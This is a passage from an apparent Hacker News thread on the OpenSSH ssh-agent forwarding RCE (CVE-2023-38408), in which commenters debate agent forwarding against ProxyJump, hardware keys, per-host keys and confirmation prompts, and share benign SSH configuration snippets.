attacker-controlled? ;) | | --- | --- | --- | | | |  |  | [nocsi](user?id=nocsi) [on July 19, 2023](item?id=36794163)   | [root](#36791441) | [parent](#36793804) | [next](#36790649) [–]  Yea, but there’s a security boundary wherein you don’t want the SSH host to be executing code in *your* environment. Of course, the attackers can backdoor sshd to log credentials, setup init scripts on the host to execute code every client login and other shenanigans. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36794448)   | [root](#36791441) | [parent](#36794163) | [next](#36790649) [–]  Of course. So it's not really that out of the question *if* you are using agent forwarding, so, yeah, this is a big deal. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on July 19, 2023](item?id=36790649)   | [prev](#36791441) | [next](#36790802) [–]  Even without this announcement, friends don't let friends forward their ssh agent. It essentially grants that machine access to your private keys. A RCE vulnerability is strictly worse than key exposure, but you probably shouldn't have been using it anyways. | | --- | --- | --- | | | |  |  | [willbicks](user?id=willbicks) [on July 19, 2023](item?id=36790842)   | [parent](#36790649) | [next](#36791976) [–]  I prefer using hardware tokens (in most cases a PKCS#11 smart card) because it means that even with a forwarded SSH agent, every request to use my private key requires a PIN on my client which is verified by the isolated cryptographic processor. It's impossible for my private key to leave that card and get cached anywhere else. While I haven't enabled it on my Yubikey I understand they can do similar. The downside is that compatibility in edge cases, while much better than I'd expect, is still not perfect. In particular Windows support outside of Putty gets challenging. | | --- | --- | --- | | | |  |  | [gorkish](user?id=gorkish) [on July 19, 2023](item?id=36791063)   | [root](#36790649) | [parent](#36790842) | [next](#36792499) [–]  The RCE is related to ssh-agent's support for PKCS#11, so, yeah you are right this is a valid method to prevent key access or theft via the agent (I also have to approve every use of my PK), but in this case it's not protecting against the RCE, and the workaround in the meantime is to disable PKCS#11 `ssh-agent -P ''` | | --- | --- | --- | | | |  |  | [toast0](user?id=toast0) [on July 19, 2023](item?id=36792499)   | [root](#36790649) | [parent](#36790842) | [prev](#36791063) | [next](#36791232) [–]  The other downside is it's much harder to do bulk operations against a fleet. It's not reasonable to enter a PIN for each access when you need to push something to 1000 nodes. 100 nodes is probably ok, but not great. | | --- | --- | --- | | | |  |  | [throwawaaarrgh](user?id=throwawaaarrgh) [on July 19, 2023](item?id=36791232)   | [root](#36790649) | [parent](#36790842) | [prev](#36792499) | [next](#36792673) [–]  or you could just use the -c option to ssh-add and be prompted every time the key is handed over | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792673)   | [root](#36790649) | [parent](#36790842) | [prev](#36791232) | [next](#36795516) [–]  That won't save you for this RCE! | | --- | --- | --- | | | |  |  | [themoonisachees](user?id=themoonisachees) [on July 20, 2023](item?id=36798406)   | [root](#36790649) | [parent](#36792673) | [next](#36795516) [–]  It will save his keys though. It's a start. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 20, 2023](item?id=36803118)   | [root](#36790649) | [parent](#36798406) | [next](#36795516) [–]  It is a start, true, but it's already game over: if I can execute code on your box, then the keys are the least of the treasures I've uncovered. I can initiate connections, keylog, request or hide confirmations, steal all your other data, piggyback on your authorized SSH connections, etc. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on July 20, 2023](item?id=36795516)   | [root](#36790649) | [parent](#36790842) | [prev](#36792673) | [next](#36791976) [–]  ssh-agent forwarding does have some use cases with hardware keys. However, most people aren't using hardware keys. | | --- | --- | --- | | | |  |  | [TechBro8615](user?id=TechBro8615) [on July 19, 2023](item?id=36791976)   | [parent](#36790649) | [prev](#36790842) | [next](#36791433) [–]  I think SSH agent forwarding is a fairly common setup with VSCode Remote, where the developer wants to forward their keys to the remote dev server so that they can perform Git operations using their credentials. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792659)   | [root](#36790649) | [parent](#36791976) | [next](#36791433) [–]  Easy fix: generate private keys on the remote dev server and then use those keys instead of your own with git. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794655)   | [root](#36790649) | [parent](#36792659) | [next](#36791433) [–]  This exposes your private keys to a potentially less-trusted dev server. It also just doesn’t work with hardware tokens for the same reason. | | --- | --- | --- | | | |  |  | [TechBro8615](user?id=TechBro8615) [on July 19, 2023](item?id=36794815)   | [root](#36790649) | [parent](#36794655) | [next](#36791433) [–]  Is it possible to configure SSH agent forwarding to only forward some specific private keys? Although I guess that wouldn't protect you from the root problem of a vulnerable OpenSSH client. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794909)   | [root](#36790649) | [parent](#36794815) | [next](#36795568) [–]  > Is it possible to configure SSH agent forwarding to only forward some specific private keys? Not sure about that, but you can configure it so that it asks you for confirmation before every private key usage, so I suspect you could script a solution around that confirmation mechanism? > Although I guess that wouldn't protect you from the root problem of a vulnerable OpenSSH client. Yes – in the end, your SSH client, the terminal emulator it's running in etc. are ultimately software too that could be remotely exploited. I think in this particular case, there was a certain mismatch of threat expectations between the attack surfaces of ssh (the client, exposed to lots of potentially malicious input) and ssh-agent (mostly accepting input from semi-trusted processes on the same host – except for agent forwarding, of course). | | --- | --- | --- | | | |  |  | [jyxent](user?id=jyxent) [on July 20, 2023](item?id=36795568)   | [root](#36790649) | [parent](#36794815) | [prev](#36794909) | [next](#36791433) [–]  You can restrict keys when added so that they are only available on specific hosts: <https://www.openssh.com/agent-restrict.html> | | --- | --- | --- | | | |  |  | [salawat](user?id=salawat) [on July 19, 2023](item?id=36791433)   | [parent](#36790649) | [prev](#36791976) | [next](#36790804) [–]  Real talk though. How do you manage ssh chaining then? Unique set of keys per user per machine? Short of scp'ing your private key over from your starting box, I can't really think of another way. Then again, if it's not your box, (you don't own the hardware have sole monopoly of root), you probably shouldn't be ssh'ing from it anyway. I've always held there are no true secrets on a computer... Until multi-billion dollar companies decide to collude anyway. Anywho, honest question. I'm a big fan of ssh roaming, never realized that ssh-agent was a thing, but after reading this, if I were to use it, I'd most certainly be doing it witout pkcs11 built in. Shotgunning shared libs for side-effects is absolutely mad. Need to slot that into my source code reading list. | | --- | --- | --- | | | |  |  | [jcotton42](user?id=jcotton42) [on July 19, 2023](item?id=36791477)   | [root](#36790649) | [parent](#36791433) | [next](#36791488) [–]  Depending on your usecase, ProxyJump may suffice <https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump> | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on July 19, 2023](item?id=36791488)   | [root](#36790649) | [parent](#36791433) | [prev](#36791477) | [next](#36790804) [–]  > How do you manage ssh chaining then ProxyJump in the .ssh/config file. If your SSH is too old to support ProxyJump, you should probably upgrade, but this works as well: ```    ProxyCommand ssh -q -W %h:%p jumpost ``` | | --- | --- | --- | | | |  |  | [salawat](user?id=salawat) [on July 19, 2023](item?id=36792243)   | [root](#36790649) | [parent](#36791488) | [next](#36790804) [–]  Noted... Guess I know what I'm doing today! Edit: Nevermind, tried it, not sufficient for my use case. I tend to do a lot of mesh-y bouncing around between servers, and -J seems to be more intended for a star/hub&spoke topology. Common ssh priv-key to all machines, or alternatively, a unique set of priv\_keys per user per dest machine is about the way to go. You still have privilege escalations to worry about, but thems the breaks. It's a neat trick, I'll give it that. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on July 19, 2023](item?id=36793227)   | [root](#36790649) | [parent](#36792243) | [next](#36792732) [–]  It's not limited to star topologies; You can use ProxyJump for any topology that includes fixed routes from a client to a host. Just add a separate host entry for each machine. 4 server example (this assumes your client can connect to only host C) with the following topology: ```     C -> B -> A      \-> D   ``` ssh configuration snippet: ```     Host A       ProxyJump B      Host B       ProxyJump C      Host D       ProxyJump C  ``` This example is a tree-like topolgy, but you can use host aliases (i.e. add a HostName that is different from the host entry) to define any fixed route to any machine you like. | | --- | --- | --- | | | |  |  | [saltcured](user?id=saltcured) [on July 19, 2023](item?id=36794629)   | [root](#36790649) | [parent](#36793227) | [next](#36792732) [–]  For me, the main use of agent-forwarding is that I need to use a command that expects to use SSH to get between leaf nodes. For example git or rsync CLIs that need to manipulate the local filesystem and tunnel their own protocol over SSH to talk to another remote server. At times, I've wished for something like uMatrix but for ssh-agent forwarding, so I could have policies for which peer-to-peer authentications should be allowed for which keys and whether these specific uses should require interactive confirmation. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [on July 20, 2023](item?id=36799955)   | [root](#36790649) | [parent](#36794629) | [next](#36792732) [–]  I now have a design in my head for something like that using ssh certificates. Since I have zero use for such a thing I would probably build it wrongly though. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792732)   | [root](#36790649) | [parent](#36792243) | [prev](#36793227) | [next](#36790804) [–]  Just generate a new keypair there on your bounce box then. Don't do -A because this RCE means that not only do you lose your keys, but you lose your laptop, too! | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794721)   | [root](#36790649) | [parent](#36792732) | [next](#36790804) [–]  What if you don’t trust the box enough to store a private key, though? | | --- | --- | --- | | | |  |  | [themoonisachees](user?id=themoonisachees) [on July 20, 2023](item?id=36798417)   | [root](#36790649) | [parent](#36794721) | [next](#36790804) [–]  A box you can't trust to hold your keys could just as easily put a ssh -A command in your bashrc and use your agent to perform stuff on any servers your key is accepted on. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36800053)   | [root](#36790649) | [parent](#36798417) | [next](#36790804) [–]  Not if your agent supports and is configured to confirm each use. See ssh-add -c. | | --- | --- | --- | | | |  |  | [starfallg](user?id=starfallg) [on July 19, 2023](item?id=36790804)   | [parent](#36790649) | [prev](#36791433) | [next](#36790802) [–]  Yup, and this is explained in detail in the ssh(1) man page. No-one should be using -A. Using a jump host via -J is the way to go. | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36790864)   | [root](#36790649) | [parent](#36790804) | [next](#36798476) [–]  One use of -A, namely using the ssh server as a jumphost, is covered by -J. The general use of -A, namely doing operations on the ssh server that require keys from the ssh client, is not. If I'm on machine foo and I want to connect to bar.example.org and clone a git repo there from baz.example.org, and baz.example.org requires an identity key that is in foo's ssh agent, then -A is the only option. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792692)   | [root](#36790649) | [parent](#36790864) | [next](#36792716) [–]  No, you might as well copy the keys over there for all the security you're getting (actually, that's safer given this RCE which compromises both sides, even given that there's no real way to shred the leaked key, but of course I'm not actually suggesting this! they're both really bad.) Your best option is too easy: just generate a new keypair on foo. Then you can populate baz.example.org with that public key instead of your own. | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36793397)   | [root](#36790649) | [parent](#36792692) | [next](#36792716) [–]  >No, you might as well copy the keys over there Only if the keys are insecure enough to be copied, ie not backed by an HSM, or backed by an HSM but marked exportable. >for all the security you're getting (actually, that's safer given this RCE which compromises both sides, even given that there's no real way to shred the leaked key, but of course I'm not actually suggesting this! they're both really bad.) Connecting to a malicious SSH server is already dangeorous with or without this vulnerability, and with or without agent forwarding. Eg a malicious server can modify the shell to emit VT codes to mess up your terminal. >Your best option is too easy: just generate a new keypair on foo. Sure, but this creates additional identities that baz.example.org must be taught to trust, which is not always desirable or even an option. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36793627)   | [root](#36790649) | [parent](#36793397) | [next](#36792716) [–]  > Only if the keys are insecure enough to be copied, ie not backed by an HSM, or backed by an HSM but marked exportable. Agent forwarding forwards *the keys* insecurely. If you can launch an agent-forwarded connection, then the HSM is already irrelevant. > "Connecting to a malicious SSH server" is already dangeorous with or without this vulnerability, and with or without agent forwarding. Eg a malicious server can modify the shell to emit VT codes to mess up your terminal. yes, but messing up your terminal is not an RCE (and you should be able to fix it with stty sane). It's just an annoyance and just tipped you off that obviously there's something *wrong* there. :) Obviously you should be checking your host keys etc and ideally you woud never accidentally connect to a malicious server. However, in the unlucky but perhaps inevitable event that you do connect to a malicious server, you shouldn't risk exposing your entire client workstation! (through this or another RCE) or your SSH private keys! (through normal agent forwarding operation) with agent forwarding. > Sure, but this creates additional identities that baz.example.org must be taught to trust, which is not always desirable or even an option. A key is not necessarily an identity. Most platforms permit more than one public key to be associated with a user, including github, gitlab, userify, etc. However, ideally you are correct -- this would result in a new user account that has limited access to only the things it really needs (principle of least privilege). | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36794503)   | [root](#36790649) | [parent](#36793627) | [next](#36792716) [–]  >Agent forwarding forwards the keys insecurely. If you can launch an agent-forwarded connection, then the HSM is already irrelevant. No? ssh-agent works fine with keys that are not exportable from the HSM. By the very definition it's not possible for anything to export the key, ssh-agent or otherwise. >yes, but messing up your terminal is not an RCE It has been, and can be again. [https://www.cyberark.com/resources/threat-research-blog/dont...](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters) | | --- | --- | --- | | | |  |  | [iudqnolq](user?id=iudqnolq) [on July 20, 2023](item?id=36797163)   | [root](#36790649) | [parent](#36794503) | [next](#36792716) [–]  That's not an RCE, it's a DoS. As the article describes most Windows terminal emulators just call SetWindowText when they get the set window title escape code. For some reason Windows implements that function very inefficiently so if it ends up being called in a tight loop your computer can freeze. | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 20, 2023](item?id=36801851)   | [root](#36790649) | [parent](#36797163) | [next](#36792716) [–]  Read carefully. >I was searching for a bug in ANSI characters that respond to a change of the window’s title. One of the things I did was check how the previous bugs were exploited. One of them, CVE-2015-8971 (found by Nicolas Braud-Santoni), was a bug in Terminology 0.7.0 that didn’t filter new line (\n) escape character when changing the window title. It allowed you to modify the window title and then re-insert it into the terminal’s input buffer, resulting in arbitrary terminal input, which then caused code execution. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 20, 2023](item?id=36803071)   | [root](#36790649) | [parent](#36801851) | [next](#36792716) [–]  That's a vulnerability in your terminal app, not in SSH, like a browser vuln when connecting to a remote website, but you're right, the point is well taken: there is always that possibility and you should be quite careful about choosing your terminal application. | | --- | --- | --- | | | |  |  | [drdaeman](user?id=drdaeman) [on July 19, 2023](item?id=36792716)   | [root](#36790649) | [parent](#36790864) | [prev](#36792692) | [next](#36791036) [–]  Another relatively popular use case is pam\_ssh\_agent\_auth for passwordless-but-authenticated sudo. This, by definition, requires agent forwarding. (I don't use ssh-agent, I use gpg-agent with an SSH socket - I suppose I'm fine?) | | --- | --- | --- | | | |  |  | [GauntletWizard](user?id=GauntletWizard) [on July 19, 2023](item?id=36791036)   | [root](#36790649) | [parent](#36790864) | [prev](#36792716) | [next](#36798476) [–]  ssh-askpass is a great tool in these situations. It intercedes and allows you to manually control all key usage attempts. | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36791554)   | [root](#36790649) | [parent](#36791036) | [next](#36791452) [–]  I'm not sure what relevance ssh-askpass has to what I wrote. | | --- | --- | --- | | | |  |  | [GauntletWizard](user?id=GauntletWizard) [on July 19, 2023](item?id=36793515)   | [root](#36790649) | [parent](#36791554) | [next](#36791452) [–]  Right, this recipe isn't well known. `ssh-add -c` will cause your ssh agent to pop up with ssh-askpass every time it does an authentication. This is fiddly; You need to have configured your ssh-agent right, and there's a slightly different version to use keychains on macos that's equivalent. | | --- | --- | --- | | | |  |  | [Arnavion](user?id=Arnavion) [on July 19, 2023](item?id=36794536)   | [root](#36790649) | [parent](#36793515) | [next](#36791452) [–]  Once again, I'm not sure what relevance this has to the discussion. | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36798501)   | [root](#36790649) | [parent](#36794536) | [next](#36791452) [–]  Some people denounce all use of agent forwarding because, by default, ssh-agent doesn't confirm with the user before signing a request with the users private key. This means, if you ssh into a compromised/malicious host with your agent forwarded, malicious code on that machine can just silently ssh into other servers as you. This trick has been used in the past by blackhats to escalate from a compromised CI environment to full production takeover. GauntletWizard probably meant to respond to your parent in this thread. | | --- | --- | --- | | | |  |  | [devnullbrain](user?id=devnullbrain) [on July 19, 2023](item?id=36791452)   | [root](#36790649) | [parent](#36791036) | [prev](#36791554) | [next](#36798476) [–]  Ah, a skillful execution of Cunningham's Law | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36798476)   | [root](#36790649) | [parent](#36790804) | [prev](#36790864) | [next](#36790802) [–]  There are uses for `-A` that aren't just for jumping into hosts. I work on code in ephemeral containers and need to use git against remote git servers. If I had to use a key local to the container, I'd have to constantly add new keys to my git servers. Of course, I have secured by agent from abuse. I use gpg-agent as my ssh agent and make it visually confirm every use of my private key. I even set up those containers to use forwarded GIT\_{AUTHOR,COMMITTER}\_{NAME,EMAIL} envs. So other people can work on the same container as me and git commits we make are still attributed correctly. | | --- | --- | --- | | | |  |  | [apienx](user?id=apienx) [on July 19, 2023](item?id=36790802)   | [prev](#36790649) | [next](#36794006) [–]  Agent forwarding is discouraged by the OpenSSH crew. Yet, it's commonly used because of the convenience it affords. "Agent forwarding should be enabled with caution. Users with the ability to bypass file permissions on the remote host (for the agent's UNIX-domain socket) can access the local agent through the forwarded connection." <https://man.openbsd.org/ssh.1> Glad the vulnerability got fixed. | | --- | --- | --- | | | |  |  | [wahern](user?id=wahern) [on July 19, 2023](item?id=36794006)   | [prev](#36790802) | [next](#36790632) [–]  musl libc refuses to implement dlclose[1] for precisely the reason that modules too often misbehave when dropped at runtime, and requiring this behavior is very rarely needed if ever. The number of modules that will be loaded is almost always bounded, and keeping a module around in memory is mostly harmless; certainly less harmful on average than trying to unload it. [1] see [https://wiki.musl-libc.org/functional-differences-from-glibc...](https://wiki.musl-libc.org/functional-differences-from-glibc.html#Unloading-libraries) | | --- | --- | --- | | | |  |  | [gpderetta](user?id=gpderetta) [on July 20, 2023](item?id=36798457)   | [parent](#36794006) | [next](#36797375) [–]  Also, as you pointed out elsethread, dlclose makes a lot of things in a runtime implementation very hard. For example one reason that C++ exceptions are expensive is that they need to guard against unwind tables suddenly disappearing. | | --- | --- | --- | | | |  |  | [10000truths](user?id=10000truths) [on July 20, 2023](item?id=36797375)   | [parent](#36794006) | [prev](#36798457) | [next](#36790632) [–]  > musl libc refuses to implement dlclose[1] for precisely the reason that modules too often misbehave when dropped at runtime, Which is some rather silly logic, because now musl's libdl is just *one more* module that misbehaves at runtime by refusing to clean up after itself. Other libraries being sloppy about resource cleanup is no excuse for musl to abdicate its own responsibilities. > and requiring this behavior is very rarely needed if ever. The number of modules that will be loaded is almost always bounded, and keeping a module around in memory is mostly harmless; I take it you've never used an application that hot-reloads plugins? Who cares about memory leaks, right? > certainly less harmful on average than trying to unload it. That's for the application to decide, not musl. If I don't trust a library to behave properly, I will either not dlopen it at all, or I'll dlopen it in an appropriately sandboxed subprocess and interact with it via pipes. | | --- | --- | --- | | | |  |  | [wahern](user?id=wahern) [on July 20, 2023](item?id=36797648)   | [root](#36794006) | [parent](#36797375) | [next](#36790632) [–]  > I take it you've never used an application that hot-reloads plugins? Used *and* implemented many times. Sometimes this could be a problem, but IME most plugin architectures I've seen don't rely on static constructors or destructors for implicit registration/deregistration of callbacks. Among other reasons, it's a landmine of multi-threading issues and glibc itself has historically had many bugs related to this, albeit mostly a consequence of glibc implementing (until recently) libpthread separate from libc. Also, POSIX does not guarantee that dlclose does anything: "An application writer may use dlclose() to make a statement of intent on the part of the process, but this statement does not create any requirement upon the implementation." > Who cares about memory leaks, right? I can't find the blog post now, but IIRC Solaris made getenv thread-safe by never deallocating any memory allocated for the environ array or its contents. The blog post had a curious and memorable defense which explained how the memory usage was asymptotically bounded, similar to how hash table operations are described as asymptotically O(1) in time. And Solaris cares very much about memory management--unlike Linux or FreeBSD it implements strict memory accounting, so no OOM killer non-sense. Is it ideal? No. But these are legitimate decisions taken in light of lots of experience, and if you want to write truly robust applications one has to pay attention to standards, implementation details, and best practices. IME best practice wrt module systems on Unix and the open source world generally has always been to avoid implicit registration/deregistration of callbacks. I believe the same is true in the Windows world, though I've never written much software for Windows. (Anyone know if FreeLibrary immediately invokes static destructors?) FWIW, I have implemented hacks which relied on static constructors and where hot reloading was more problematic in the absence of static destructors. For example, I once implemented a proof of concept for automatic runtime reloading of SSL certificates and keys in the Splunk server by writing a library interposer (supporting FreeBSD, Linux, macOS, and Solaris) that installed global OpenSSL SSL\_CTX callbacks. So I know why these things could be useful. But that example was a PoC hack. And even in situations where dlcose is supported as one might naively expect, you can still easily run into similar gotchas, like a user loading a module twice under different names. You have to choose either to deal with it the hard way, or disclaim support for such niche cases. | | --- | --- | --- | | | |  |  | [binkHN](user?id=binkHN) [on July 19, 2023](item?id=36790632)   | [prev](#36794006) | [next](#36795342) [–]  Full details: [https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh...](https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt) | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [on July 20, 2023](item?id=36795342)   | [prev](#36790632) | [next](#36800240) [–]  Why in the year of our Lord two thousand and twenty three do we still tolerate loading shared libraries with executable stacks? | | --- | --- | --- | | | |  |  | [pritambaral](user?id=pritambaral) [on July 20, 2023](item?id=36800240)   | [prev](#36795342) | [next](#36792374) [–]  The suggestion floated in many comments here to create extra keypairs on remote hosts for access to other remotes from the former is a terrible idea. Resident private keys on a compromised machine can be exfiltrated. Even if they're passphrase protected, using them requires them to be decrypted on the machine they're resident on. `ssh-agent` is not the only SSH Agent. There exist SSH Agent implementations that are secure. E.g., gpg-agent. Use one of those, with the `ssh-add -c` flag or equivalent, and you get both security and convenience. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792374)   | [prev](#36800240) | [next](#36794113) [–]  Note: you are not vulnerable if you're not doing agent forwarding (-A). Honestly, you probably should never do -A anyway; use -J (proxyjump) instead. <https://www.man7.org/linux/man-pages/man1/ssh.1.html> <https://userify.com/docs/jumpbox> | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [on July 19, 2023](item?id=36792489)   | [parent](#36792374) | [next](#36792526) [–]  There are situations where `-J` won't work. For example, if I'm on a remote server and I want to clone or pull from a private repository, or push to any repository In fact, VS code expects you to forward an agent when developing on a remote instance with the remote-ssh extension. I believe it uses it for syncing repo changes primarily I agree though that you should consider it insecure to forward a connection to a shared host if it has other users who are equally privileged, or more privileged | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792631)   | [root](#36792374) | [parent](#36792489) | [next](#36797448) [–]  > There are situations where `-J` won't work. That is true, but actually you should avoid -A in those situations also. > In fact, VS code expects you to forward an agent when developing on a remote instance with the remote-ssh extension. I believe it uses it for syncing repo changes primarily That's the case if you're ever trying to initiate an SSH connection via Git *from* a remote host. That's because the actual SSH connection isn't being triggered on your desktop or laptop, where -J would do it, but because it's being initiated right on the remote server itself. Let's call the remote server VSCODE (your desktop-in-the-cloud), your laptop/desktop LAPTOP, and the remote repo GITHUB. So, the correct answer there is actually counter-intuitive: Generate a private key on VSCODE (not LAPTOP) for that GITHUB repo. This key will be used only on that originating remote server (VSCODE), never anywhere else. In fact, that repo key will ideally be scoped as tightly as possible in Github/Gitlab/etc. As a general rule of thumb, generate at least one SSH key for each "location" where you'll be logging into another location. Keep your connections point-to-point unless you can use proxyjump. | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [on July 19, 2023](item?id=36792733)   | [root](#36792374) | [parent](#36792631) | [next](#36794955) [–]  > Generate a private key on VSCODE (not LAPTOP) for that GITHUB repo. This key will be used only on that originating remote server (VSCODE), never anywhere else. Deploy keys are more secure in most situations, but I'm not convinced that generating a bunch of additional keys with write access to your repo is *always* more secure. Regardless, it doesn't really fulfill the same need of "get access to repo from cloud desktop asap". I work with 20-30 private repos at my company, and I don't have admin access to most of them (so I couldn't create deploy keys for them). That would need to be kicked up and down a request pipeline, for each user accessing remotely, for each host they're accessing it from. It's *much* easier to Get The Work Done if I just forward my agent. And sure, the company could maybe set up better practices (though again, I'm not even really clear on how much more secure it would be to generate untold numbers of deploy keys), but I'm more likely to get the axe for not producing fast enough than they are to make sweeping changes to their security practices. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36793031)   | [root](#36792374) | [parent](#36792733) | [next](#36794955) [–]  Then just create a key on that box and use it for *all* of your repos (add it to your github keychain); you're still much better off than with one key to rule them all (and one RCE to rule your laptop ha) | | --- | --- | --- | | | |  |  | [pcthrowaway](user?id=pcthrowaway) [on July 19, 2023](item?id=36793679)   | [root](#36792374) | [parent](#36793031) | [next](#36794955) [–]  That's a good point, probably the best way to do this, but does require manual management steps for every VM you want to use (which is perhaps a feature) | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794955)   | [root](#36792374) | [parent](#36792631) | [prev](#36792733) | [next](#36797448) [–]  > Generate a private key on VSCODE (not LAPTOP) for that GITHUB repo. This key will be used only on that originating remote server (VSCODE), never anywhere else. This gives anyone compromising the server at a point in time persistent access to your Github repo. Ultimately, there's two or three different possible models here (transparent SSH proxying, agent forwarding, key-per-host), with different tradeoffs. Although transparent proxying is usually the safest, it doesn't always work and here's no one-size-fits-all. | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [on July 20, 2023](item?id=36797448)   | [root](#36792374) | [parent](#36792489) | [prev](#36792631) | [next](#36792526) [–]  VS Code forcing people to follow bad practice, I'm shocked, SHOCKED, I tell you. | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [on July 19, 2023](item?id=36792526)   | [parent](#36792374) | [prev](#36792489) | [next](#36794113) [–]  > Honestly, you probably should never do -A anyway; use -J (proxyjump) instead. I want to copy files between servers, ex. `ssh -A serverA` then `rsync ./foo serverB:`. Is there a way to do that without `ssh -A`? (And obviously without creating an actual private SSH key on either server) | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792752)   | [root](#36792374) | [parent](#36792526) | [next](#36794113) [–]  Yes. Create a temporary (or permanent) private key on server A and then put its public key in server B. That's the correct way to handle this situation, definitely not -A. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 2023](item?id=36794970)   | [root](#36792374) | [parent](#36792752) | [next](#36794113) [–]  This implies a much higher level of trust in a dev server than might be warranted, since an attacker can exfiltrate keys from that server and then permanently use them from elsewhere. Agent forwarding doesn't have that problem. > That's the correct way to handle this situation, definitely not -A. Maybe for your situation; certainly not for all. If agent forwarding was strictly inferior to ProxyJump/ProxyCommand, it would have been deprecated. | | --- | --- | --- | | | |  |  | [1letterunixname](user?id=1letterunixname) [on July 19, 2023](item?id=36794113)   | [prev](#36792374) | [next](#36791522) [–]  I use a USB security key for gpg-agent. gpg-agent is used as an ssh-agent replacement (also replaces the venerable monkeysphere script). gpg agent forwarding is also needed via StreamLocalBindUnlink for signing built RPMs in a docker container on a remote (local LAN) Docker host. Sometimes rarely, I need to enable "ssh-agent" forwarding where I probably could proxyjump instead. My interactive ssh workflow is sometimes slowed as I use TOTP (via PAM) for 2FA. Noninteractive system accounts get dedicated ssh keys. host keys are constantly scanned and compared to a source of truth. Maybe I'll get around to deploying LDAP with OpenSSH-LPK to move away from flat files. *Knee-jerk suggestion to rewrite the world in Rust combined with formal verification.* But seriously, being an expert knife juggler is still gambling with the obvious compared to using safer tools in a safer manner. Rust needs the ubiquity of GCC[0] (partially by adding them to LLVM and adding std crates) and more attention paid to bloat (cargo-bloat, etc) before attempting to rewrite the world (apart from special cases). 0. <https://gcc.gnu.org/backends.html> | | --- | --- | --- | | | |  |  | [kneebonian](user?id=kneebonian) [on July 19, 2023](item?id=36791522)   | [prev](#36794113) | [next](#36790883) [–]  Can I just say I know it's really dumb, but I loved that they published the explanation as a simple txt file, instead of setting up some whizbang website for it, or embedding it in their company blog. [https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh...](https://www.qualys.com/2023/07/19/cve-2023-38408/rce-openssh-forwarded-ssh-agent.txt) | | --- | --- | --- | | | |  |  | [py4](user?id=py4) [on July 20, 2023](item?id=36797024)   | [parent](#36791522) | [next](#36790883) [–]  Used to be common for hacking-related docs. Miss those <http://phrack.org/issues/49/15.html#article> | | --- | --- | --- | | | |  |  | [berkle4455](user?id=berkle4455) [on July 19, 2023](item?id=36790883)   | [prev](#36791522) | [next](#36791058) [–]  What's a better solution if you want to be able to SSH across multiple machines? Do you need to always close the current connection to get back to localhost prior to a fresh SSH? e.g. how would I ssh into foo, and then later into bar, or perhaps pull some code from github onto foo that is authenticated by my key? ```     localhost -> foo -> bar     localhost -> foo -> github access  ``` It seems like the answer is either: a) ssh -A, or b) install my private key on foo. | | --- | --- | --- | | | |  |  | [gunapologist99](user?id=gunapologist99) [on July 19, 2023](item?id=36792832)   | [parent](#36790883) | [next](#36800099) [–]  Better options: c) use proxyjump (-J) to access bar (<https://www.man7.org/linux/man-pages/man1/ssh.1.html>), and/or d) generate a new private key on foo and use that to access github. You might think that's a crazy waste of time compared to forwarding, but it's actually much, much safer and actually only takes a moment: ```     ssh-keygen -t ed25519     cat ~/.ssh/id_ed25519.pub  ``` and then just paste that in Github. See also <https://userify.com/docs/jumpbox> for more jumpbox docs. | | --- | --- | --- | | | |  |  | [lxgr](user?id=lxgr) [on July 19, 